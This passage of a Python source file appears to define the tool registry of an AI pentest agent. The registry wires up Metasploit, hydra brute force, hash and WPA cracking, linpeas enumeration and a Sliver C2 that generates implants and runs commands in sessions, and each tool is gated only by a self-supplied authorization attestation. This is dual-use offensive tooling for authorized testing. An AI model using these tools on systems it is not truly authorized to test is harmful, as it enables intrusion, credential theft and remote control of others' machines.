                 "backups, db exports. Uses WPSCAN_API_TOKEN for CVE data if set. Requires "
                 "'target'+'authorization'. (Passive detection alternative: wp_vulnscan.)"),
        "args": {"target": "WordPress URL you are authorized to test", "authorization": "attestation", "enumerate": "wpscan --enumerate value (default vp,vt,u,cb,dbe)", "extra": "optional extra flags"},
        "func": tool_wpscan,
    },
    "exploit_search": {
        "desc": "Offline Exploit-DB lookup (searchsploit) by product/version or CVE id. DB search only.",
        "args": {"query": "product/version text", "cve": "or a CVE id"},
        "func": tool_exploit_search,
    },
    "msf": {
        "desc": ("Run a Metasploit module non-interactively against an authorized target. Requires "
                 "'target'+'authorization'+'module'; pass module 'options' as a dict. Validate the "
                 "module and blast radius first; least-destructive proof."),
        "args": {"target": "RHOSTS you are authorized to test", "authorization": "attestation", "module": "msf module path", "options": "dict of module options", "action": "run|check|exploit (default run)"},
        "func": tool_msf,
    },
    "bruteforce": {
        "desc": ("Online credential testing (hydra) against an authorized service. LOUD and can "
                 "lock accounts — authorized + rate-agreed only. Requires 'target'+'authorization'+"
                 "'service' and a user/pass source."),
        "args": {"target": "host you are authorized to test", "authorization": "attestation", "service": "ssh|ftp|smb|http-post-form|...", "userlist": "path", "passlist": "path", "user": "or a single user", "password": "or a single password", "path": "form/path spec for http services", "extra": "optional flags"},
        "func": tool_bruteforce,
    },
    "crack": {
        "desc": ("Offline hash cracking (hashcat, else john) on hashes you are authorized to hold. "
                 "Requires 'authorization', a 'hashfile', a hashcat 'mode' and a 'wordlist'."),
        "args": {"target": "engagement/host the hashes came from", "authorization": "attestation", "hashfile": "path to hashes", "mode": "hashcat mode e.g. 22000/0/1000", "wordlist": "path (default rockyou)", "extra": "optional flags"},
        "func": tool_crack,
    },
    "postexploit": {
        "desc": ("LOCAL privilege-escalation ENUMERATION on an authorized host (linpeas if present, "
                 "else a built-in quick enum). Enumeration only — no persistence/lateral movement. "
                 "Requires 'authorization'. fetch=true allows downloading linpeas."),
        "args": {"target": "host (default localhost)", "authorization": "attestation + RoE permits post-ex", "fetch": "optional 'true' to fetch linpeas"},
        "func": tool_postexploit,
    },
    "wifi_capture": {
        "desc": ("Capture a WPA handshake / PMKID on a network YOU are authorized to test "
                 "(hcxdumptool). Requires a monitor-mode 'interface', a 'bssid', and 'authorization'."),
        "args": {"interface": "PHYSICAL iface e.g. wlan0 (hcxdumptool sets monitor mode itself)", "bssid": "target AP BSSID/SSID you are authorized to test", "authorization": "attestation", "channel": "optional channel+band e.g. 11a (else all freqs)", "seconds": "capture window (default 60)", "out": "output pcapng path", "extra": "optional flags"},
        "func": tool_wifi_capture,
    },
    "c2": {
        "desc": ("Manage a Sliver C2 for an AUTHORIZED red-team / adversary-emulation engagement: "
                 "status, start a listener, generate a beacon/implant for the authorized scope, "
                 "list sessions/beacons, or exec a command in a session. Requires 'target' "
                 "(engagement/scope) + 'authorization' for everything except status; SCOPE.md-"
                 "confined. Orchestrates a standard framework — no custom implants/evasion."),
        "args": {"op": "status|listener|generate|sessions|beacons|exec|help", "target": "engagement/scope you are authorized to test", "authorization": "attestation", "proto": "https|http|mtls", "lhost": "C2 callback host", "lport": "listener port", "os": "implant os", "arch": "implant arch", "format": "exe|shellcode|shared", "beacon": "true for a beacon", "save": "implant output path", "session": "session id (exec)", "command": "command to run (exec)"},
        "func": tool_c2,
    },
    "wifi_crack": {
        "desc": ("Convert a WPA capture to a hash and crack it offline (hcxpcapngtool + hashcat, "
                 "else aircrack-ng). Requires 'authorization', a 'capture' file and a 'wordlist'."),
        "args": {"capture": "path to .pcapng/.cap", "authorization": "attestation", "wordlist": "path (default rockyou)", "target": "network/engagement label"},
        "func": tool_wifi_crack,
    },
    "wp_vulnscan": {
        "desc": ("Scan a WordPress site you own/are authorized to test: passively detect "
                 "core, plugins and themes with their versions, flag out-of-date components "
                 "(via the WordPress.org API), and list known CVEs. With WPSCAN_API_TOKEN set "
                 "it uses the WPScan vulnerability DB (exact affected ranges); otherwise pass "
                 "cves=true for a keyless NVD keyword lookup (best-effort). Authorized targets only."),
        "args": {"url": "the WordPress site URL (yours / authorized)",
                 "cves": "optional 'true' to also run keyless CVE lookups (slower)"},
        "func": tool_wp_vulnscan,
    },
    "vuln_check": {
        "desc": ("Known-vulnerability tester. Look up CVEs for a product+version, a WordPress "
                 "plugin/theme slug, or a specific CVE id. Uses the WPScan API when "
                 "WPSCAN_API_TOKEN is set (WordPress components, exact ranges), else keyless NVD."),
        "args": {"product": "product or software name, e.g. 'elementor'",
                 "slug": "alternatively a WordPress plugin/theme slug",
                 "version": "optional version to narrow the match",
                 "kind": "'plugins' (default) or 'themes' for a WP slug",
                 "cve": "alternatively a CVE id to fetch its details, e.g. CVE-2024-1234"},
        "func": tool_vuln_check,
    },
    "playbook": {
        "desc": ("Return the offline pentest methodology shipped with the seat — the kill-chain "
                 "checklist and the role modes. section=<phase or role> for one part. Needs no "
                 "network; use it when the van has no signal."),
        "args": {"section": "optional: recon|enum|vuln|exploit|postexploit|report|webapp|wpsec|hosting|redteam|network|passwords|cellular|scout|analyzer|exploiter|reporter"},
        "func": tool_playbook,
    },
}


def _load_plugins(reg: dict) -> None:
    """Let the operator extend the registry from a drop-in file."""
    for path in (
        os.path.join(SEAT_DIR, "custom_tools.py"),
        os.path.expanduser("~/.sygnif/sygnif-py-tools.py"),
    ):
        if not os.path.isfile(path):
            continue
        ns: dict = {}
        try:
            with open(path, encoding="utf-8") as fh:
                exec(compile(fh.read(), path, "exec"), ns)  # noqa: S102 - operator's own file
            if callable(ns.get("register")):
                ns["register"](reg)
        except Exception as e:  # noqa: BLE001
            print(f"[sygnif-py] plugin {path} failed to load: {e}")


def build_registry(tool_names: list[str]) -> dict:
    """Return the active tool registry for a preset's tool list, plus plugins."""
    reg = {n: dict(BUILTIN_TOOLS[n]) for n in tool_names if n in BUILTIN_TOOLS}
    _load_plugins(reg)
    return reg


def run_tool(reg: dict, name: str, args: dict) -> str:
    tool = reg.get(name)
    if not tool:
        return f"[unknown tool '{name}'. available: {', '.join(reg) or '(none)'}]"
    try:
        return tool["func"](args or {})
    except Exception as e:  # noqa: BLE001
        return f"[tool '{name}' raised: {e}]"
